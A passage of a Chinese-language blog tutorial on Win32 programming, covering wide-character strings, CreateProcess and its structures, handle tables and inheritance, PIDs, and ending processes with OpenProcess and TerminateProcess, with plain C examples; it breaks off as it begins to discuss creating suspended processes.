00</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;locale.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">setlocale(LC_ALL, <span class="string">&quot;&quot;</span>);<span class="comment">//使用控制台默认编码</span></span><br><span class="line"><span class="keyword">wchar_t</span> wct[] = <span class="string">L&quot;中国&quot;</span>;</span><br><span class="line">wprintf(<span class="string">L&quot;%s\n&quot;</span>, wct);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="win32api中的宽字符">Win32API中的宽字符</h1><p>主要存放在<code>C:\Windows\System32</code> （存储的DLL是64位）、<code>C:\Windows\SysWOW64</code>（存储的DLL是32位）下面的所有DLL文件（几千个），没写反，就是反的，32和64，qwq。 重要的DLL文件：</p><ul><li>Kernel32.dll：最核心的功能模块，例如内存管理、进程线程相关的函数等；</li><li>User32.dll：Windows用户界面相关的应用程序接口，例如创建窗口、发送信息等；</li><li>GDI32.dll：全称是Graphical Device Interface（图形设备接口），包含用于画图和显示文本的函数。</li></ul><figure><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220401185234453.png" alt="image-20220401185234453"><figcaption aria-hidden="true">image-20220401185234453</figcaption></figure><p>win32使用字符串</p><p>字符串</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CHAR strBuff[] = <span class="string">&quot;中国&quot;</span>; <span class="comment">// char</span></span><br><span class="line"></span><br><span class="line">WCHAR strBuff[] = <span class="string">L&quot;中国&quot;</span>; <span class="comment">// wchar_t</span></span><br><span class="line"></span><br><span class="line">TCHAR strBuff[] = TEXT(<span class="string">&quot;中国&quot;</span>); <span class="comment">// TCHAR 根据当前项目的编码自动选择char还是wchar_t，在Win32中推荐使用这种方式</span></span><br></pre></td></tr></table></figure><p>指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PSTR strPoint = <span class="string">&quot;中国&quot;</span>; <span class="comment">// char*</span></span><br><span class="line"></span><br><span class="line">PWSTR strPoint = <span class="string">L&quot;中国&quot;</span>; <span class="comment">// wchar_t*</span></span><br><span class="line"></span><br><span class="line">PTSTR strPoint = TEXT(<span class="string">&quot;中国&quot;</span>); <span class="comment">// PTSTR 根据当前项目的编码自动选择如char*还是wchar_t*，在Win32中推荐使用这种方式</span></span><br></pre></td></tr></table></figure><h1 id="进程的创建">进程的创建</h1><p>程序所需要的资源（数据、代码...）是由进程提供的；进程是一种空间上的概念，它的责任就是提供资源，至于资源如何使用，与它无关。</p><figure><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220401190727181.png" alt="image-20220401190727181"><figcaption aria-hidden="true">image-20220401190727181</figcaption></figure><p>当我们在Windows下双击打开一个文件，实际上就是<code>explore.exe</code>这个进程创建的我们打开文件的进程，其使用的方法就是：CreateProcess()</p><p>进程创建的过程也就是<strong>CreateProcess函数</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.  映射EXE文件（低2G）</span><br><span class="line">2.  创建内核对象EPROCESS（高2G）(每个进程都有一个)</span><br><span class="line">3.  映射系统DLL（ntdll.dll）（放到用户区）</span><br><span class="line">4.  创建线程内核对象RTHREAD（高2G）(每个进程都有一个)</span><br><span class="line">5.  系统启动线程：</span><br><span class="line">    1.  映射DLL（ntdll.LdrInitializeThunk）</span><br><span class="line">    2.  线程开始执行</span><br></pre></td></tr></table></figure><h1 id="创建进程">创建进程</h1><p>CreateProcess：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CreateProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    LPCTSTR lpApplicationName,                 <span class="comment">// name of executable module 进程名（完整文件路径）</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPTSTR lpCommandLine,                      <span class="comment">// command line string 命令行传参</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPSECURITY_ATTRIBUTES lpProcessAttributes, <span class="comment">// SD 进程句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPSECURITY_ATTRIBUTES lpThreadAttributes,  <span class="comment">// SD 线程句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    BOOL bInheritHandles,                      <span class="comment">// handle inheritance option 句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD dwCreationFlags,                     <span class="comment">// creation flags 标志</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpEnvironment,                      <span class="comment">// new environment block 父进程环境变量</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPCTSTR lpCurrentDirectory,                <span class="comment">// current directory name 父进程目录作为当前目录，设置目录</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPSTARTUPINFO lpStartupInfo,               <span class="comment">// startup information 结构体详细信息（启动进程相关信息）</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPPROCESS_INFORMATION lpProcessInformation <span class="comment">// process information 结构体详细信息（进程ID、线程ID、进程句柄、线程句柄）</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>其中的倒数第一二个参数是结构体，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">STARTUPINFOA</span> &#123;</span></span><br><span class="line">  DWORD  cb;<span class="comment">//The size of the structure, in bytes.</span></span><br><span class="line">  LPSTR  lpReserved;</span><br><span class="line">  LPSTR  lpDesktop;</span><br><span class="line">  LPSTR  lpTitle;</span><br><span class="line">  DWORD  dwX;</span><br><span class="line">  DWORD  dwY;</span><br><span class="line">  DWORD  dwXSize;</span><br><span class="line">  DWORD  dwYSize;</span><br><span class="line">  DWORD  dwXCountChars;</span><br><span class="line">  DWORD  dwYCountChars;</span><br><span class="line">  DWORD  dwFillAttribute;</span><br><span class="line">  DWORD  dwFlags;</span><br><span class="line">  WORD   wShowWindow;</span><br><span class="line">  WORD   cbReserved2;</span><br><span class="line">  LPBYTE lpReserved2;</span><br><span class="line">  HANDLE hStdInput;</span><br><span class="line">  HANDLE hStdOutput;</span><br><span class="line">  HANDLE hStdError;</span><br><span class="line">&#125; STARTUPINFOA, *LPSTARTUPINFOA;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PROCESS_INFORMATION</span> &#123;</span></span><br><span class="line">  HANDLE hProcess;</span><br><span class="line">  HANDLE hThread;</span><br><span class="line">  DWORD  dwProcessId;</span><br><span class="line">  DWORD  dwThreadId;</span><br><span class="line">&#125; PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;</span><br></pre></td></tr></table></figure><p>不用管，直接写0就行，而且也差不多可以看懂</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">TCHAR childProcessName[] = TEXT(<span class="string">&quot;C:/WINDOWS/system32/cmd.exe&quot;</span>);</span><br><span class="line">TCHAR childPeocessCmd[] = TEXT(<span class="string">&quot;/c ping www.baidu.com&quot;</span>);</span><br><span class="line"></span><br><span class="line">STARTUPINFO si;</span><br><span class="line">PROCESS_INFORMATION pi;</span><br><span class="line">ZeroMemory(&amp;si, <span class="keyword">sizeof</span>(si));</span><br><span class="line">ZeroMemory(&amp;pi, <span class="keyword">sizeof</span>(pi));</span><br><span class="line"><span class="keyword">if</span> (CreateProcess(childProcessName,</span><br><span class="line">childPeocessCmd,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">FALSE,</span><br><span class="line"><span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;create success\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;CreateProcess Error: %d \n&quot;</span>, GetLastError());<span class="comment">//使用getlasterror获取错误信息</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CloseHandle(pi.hProcess);</span><br><span class="line">CloseHandle(pi.hThread);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="句柄表">句柄表</h1><h2 id="内核对象">内核对象</h2><p>例如进程、线程、文件、互斥体、事件等等在内核都有一个对应的结构体，这些结构体都由内核负责管理，所以我们都可以称之为内核对象。</p><p><strong>CloseHandle</strong>这个API可以关的都是内核对象</p><figure><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220401222824870.png" alt="image-20220401222824870"><figcaption aria-hidden="true">image-20220401222824870</figcaption></figure><h2 id="管理内核对象">管理内核对象</h2><p>当我们使用如下图所示的函数创建时，会在内核层创建一个结构体，而我们该如何管理这些结构体呢？或者说如何使用这些结构体呢？其实很好解决，我们可以通过内核结构体地址来管理，但是这样做存在问题：<strong>应用层很有可能操作不当导致修改啦内核结构体的地址</strong>，我们写应用层代码都知道访问到一个不存在的内存地址就会报错，而如果访问到一个内核地址是错误的，微软系统下则直接会蓝屏。</p><figure><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220401222934940.png" alt="image-20220401222934940"><figcaption aria-hidden="true">image-20220401222934940</figcaption></figure><p>这个时候句柄表出现了。</p><p>只有进程才会有句柄表，并且<strong>每一个进程都会有一个句柄表</strong>。</p><figure><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220401223201318.png" alt="image-20220401223201318"><figcaption aria-hidden="true">image-20220401223201318</figcaption></figure><p>句柄本质上就一个防火墙，将应用层、内核层隔离开来，通过句柄就可以控制进程内核结构体，我们得到所谓句柄的值实际上就是句柄表里的一个索引。</p><h2 id="多进程共享一个内核对象">多进程共享一个内核对象</h2><p>A进程通过<strong>CreateProcess函数</strong>创建了一个内核对象；B进程通过<strong>OpenProcess函数</strong>可以打开别人创建好的一个进程，也就是可以操作其的内核对象；A进程想要操作内核对象就通过其对应的句柄表的句柄（索引）来操作；B进程操作这个内核对象也是通过它自己的句柄表的句柄（索引）来操作内核对象。（需要注意的是：句柄表是一个私有的，句柄值就是进程自己句柄表的索引）</p><figure><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220401231930158.png" alt="image-20220401231930158"><figcaption aria-hidden="true">image-20220401231930158</figcaption></figure><p>在之前的例子中我们提到了CloseHandle这个函数是用来关闭进程、线程的，其实它的本质就是释放句柄，但是并不代表执行了这个函数，创建的内核对象就会<strong>彻底消失</strong>；如上图中所示内核对象存在一个计数器，目前是2，它的值是根据调用A的次数来决定的，如果我们只是在A进程中执行了<strong>CloseHandle函数</strong>，内核对象并不会消失，因为进程B还在使用，而只有进程B也执行了<strong>CloseHandle函数</strong>，这个内核对象的计数器为0，就会关闭消失了</p><p><strong>最后</strong>：注意，以上所述特性适合于<strong>除了线程</strong>以外的所有内核对象，创建进程，同时也会创建线程，如果你想把线程关闭，首先需要<strong>CloseHandle函数</strong>要让其计数器为0，其次需要有人将其关闭，所以假设我们创建了一个IE进程打开了一个网站，如果我们只是在代码中使用了<strong>CloseHandle函数</strong>，这样IE浏览器并不会关闭，需要我们手动点击窗口的关闭按钮才行（<strong>只有线程关闭了，进程才会关闭</strong>）。</p><h2 id="句柄是否可以被继承">句柄是否可以被继承</h2><p>除了我们上述的方式可以进行共享内核对象以外，Windows还设计了一种方式来提供我们共享内核对象，我们先来了解一下句柄是否"可以"被继承。</p><p>如下图所示（<strong>句柄表是有三列的，分别是句柄值、内核结构体地址、句柄是否可以被继承</strong>），比如说我们在A进程（父进程）创建了4个内核对象：</p><figure><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220401233035405.png" alt="image-20220401233035405"><figcaption aria-hidden="true">image-20220401233035405</figcaption></figure><p>这四个函数都有一个参数<strong>LPSECURITY_ATTRIBUTES lpThreadAttributes</strong>，通过这个参数我们可以判断函数是否创建的是内核对象。</p><p>比如拿CreateEvent来看：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateEventA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] LPSECURITY_ATTRIBUTES lpEventAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           BOOL                  bManualReset,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           BOOL                  bInitialState,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] LPCSTR                lpName</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>它的第一个参数，其实就是一个结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SECURITY_ATTRIBUTES</span> &#123;</span></span><br><span class="line">  DWORD  nLength;<span class="comment">//长度</span></span><br><span class="line">  LPVOID lpSecurityDescriptor;<span class="comment">//安全描述符</span></span><br><span class="line">  BOOL   bInheritHandle;<span class="comment">//句柄是否被继承，这个是重点被关注的</span></span><br><span class="line">&#125; SECURITY_ATTRIBUTES, *PSECURITY_ATTRIBUTES, *LPSECURITY_ATTRIBUTES;</span><br></pre></td></tr></table></figure><p>这里使用CreateProcess来看：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CreateProcessA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPCSTR                lpApplicationName,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, out, optional] LPSTR                 lpCommandLine,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,<span class="comment">//SD</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,<span class="comment">//SD</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                BOOL                  bInheritHandles,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                DWORD                 dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPVOID                lpEnvironment,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPCSTR                lpCurrentDirectory,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                LPSTARTUPINFOA        lpStartupInfo,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]               LPPROCESS_INFORMATION lpProcessInformation</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>有两个LPSECURITY_ATTRIBUTES结构体，一个是进程的，一个是线程的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这种是不被继承</span></span><br><span class="line">CreateProcess(childProcessName,childPeocessCmd,<span class="literal">NULL</span>,<span class="literal">NULL</span>,FALSE,<span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line"><span class="comment">//进程句柄，线程句柄都可以被继承</span></span><br><span class="line">SECURITY_ATTRIBUTES sa;</span><br><span class="line">ZeroMemory(&amp;sa, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">sa.nLength = <span class="keyword">sizeof</span>(SECURITY_ATTRIBUTES);</span><br><span class="line">sa.bInheritHandle = <span class="literal">true</span>;</span><br><span class="line">CreateProcess(childProcessName,childPeocessCmd,&amp;sa,&amp;sa,FALSE,<span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br></pre></td></tr></table></figure><h2 id="句柄是否允许被继承">句柄是否"允许"被继承</h2><p>上面是说是否可以被继承，真正继承要另一个参数，还是CreateProcess举例，是<code>bInheritHandles</code>这个参数，这个参数决定了是否允许创建的子进程继承句柄，设置为TRUE时，我们创建的子进程才允许继承父进程的句柄。</p><figure><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220401234807835.png" alt="image-20220401234807835"><figcaption aria-hidden="true">image-20220401234807835</figcaption></figure><h1 id="进程相关api">进程相关API</h1><p>CreateProcess函数会给我们返回一个结构体，包含四个数据：进程编号（ID）、进程句柄、线程编号（ID）、线程句柄。</p><p>进程ID，通常我们称之为PID，任务管理器中的就是。</p><h2 id="全局句柄表">全局句柄表</h2><p>每个进程都有一份私有的句柄表，而操作系统也有一份句柄表，我们称之为全局句柄表，这张表里包含了所有正在运行的进程、线程</p><p>PID我们就可以理解为是全局句柄表中的一个索引，那么PID和句柄的区别就很容易看出来来了，<strong>PID是全局的，在任何进程中都有意义，都可以使用，而句柄则是局部的、私有的</strong>；PID是<strong>唯一的，绝对不可能出现重复的存在</strong>，但是当进程消失，那么这个PID就有可能会分给另外一个进程。（<strong>PID不是句柄，但是可以通过PID获得到全局句柄表中其对应的句柄</strong>）</p><p>A程序打开IE，获取PID和句柄：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TCHAR childProcessName[] = TEXT(<span class="string">&quot;C:\\Program Files\\Internet Explorer\\iexplore.exe&quot;</span>);</span><br><span class="line">    TCHAR childPeocessCmd[] = TEXT(<span class="string">&quot;http://www.baidu.com&quot;</span>);</span><br><span class="line"></span><br><span class="line">    STARTUPINFO si;</span><br><span class="line">    PROCESS_INFORMATION pi;</span><br><span class="line">    ZeroMemory(&amp;si, <span class="keyword">sizeof</span>(si));</span><br><span class="line">    ZeroMemory(&amp;pi, <span class="keyword">sizeof</span>(pi));</span><br><span class="line">    <span class="keyword">if</span> (CreateProcess(childProcessName,</span><br><span class="line">                      childPeocessCmd,</span><br><span class="line">                      <span class="literal">NULL</span>,</span><br><span class="line">                      <span class="literal">NULL</span>,</span><br><span class="line">                      FALSE,</span><br><span class="line">                      <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;create success\nPID:%d, 句柄:%d&quot;</span>, pi.dwProcessId, pi.hProcess);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CreateProcess Error: %d \n&quot;</span>, GetLastError());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    CloseHandle(pi.hProcess);</span><br><span class="line">    CloseHandle(pi.hThread);</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后B使用TerminateProcess函数来终止A进程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// TerminateProcess函数</span></span><br><span class="line"><span class="function">BOOL <span class="title">TerminateProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  HANDLE hProcess, <span class="comment">// handle to the process 句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">  UINT uExitCode   <span class="comment">// exit code for the process 退出代码</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hProcess;</span><br><span class="line">    hProcess = (HANDLE)<span class="number">0x1b0</span>;</span><br><span class="line">    <span class="keyword">if</span> (!TerminateProcess(hProcess, <span class="number">1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;终止失败,%d\n&quot;</span>, GetLastError());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看见是失败，6，句柄无效，真正的关闭这个进程，那就需要借助PID来获取句柄：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">OpenProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD dwDesiredAccess,  <span class="comment">// access flag 你希望的访问权限,https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights</span></span></span></span><br><span class="line"><span class="params"><span class="function">  BOOL bInheritHandle,    <span class="comment">// handle inheritance option 是否可以被继承</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD dwProcessId       <span class="comment">// process identifier 进程ID</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hProcess;</span><br><span class="line">    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, <span class="number">0x4598</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!TerminateProcess(hProcess, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;终止进程失败：%d \n&quot;</span>, GetLastError());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行之后发现iE关了。</p><h2 id="以挂起的形式创建进程">以挂起的形式创建进程</h2><p>还是CreateProcess，第六个参数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CreateProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  LPCTSTR lpApplicationName,                 <span class="comment">// name of executable module</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPTSTR lpCommandLine,                      <span class="comment">// command line string</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPSECURITY_ATTRIBUTES lpProcessAttributes, <span class="comment">// SD</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPSECURITY_ATTRIBUTES lpThreadAttributes,  <span class="comment">// SD</span></span></span></span><br><span class="line"><span class="params"><span class="function">  BOOL bInheritHandles,                      <span class="comment">// handle inheritance option</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD dwCreationFlags,                     <span class="comment">// creation flags &lt;--这个参数</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPVOID lpEnvironment,                      <span class="comment">// new environment block</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPCTSTR lpCurrentDirectory,                <span class="comment">// current directory name</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPSTARTUPINFO lpStartupInfo,               <span class="comment">// startup information</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPPROCESS_INFORMATION lpProcessInformation <span class="comment">// process information</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    TCHAR childProcessName[] = TEXT(<span class="string">&quot;C:/WINDOWS/system32/cmd.exe&quot;</span>);</span><br><span class="line">    TCHAR 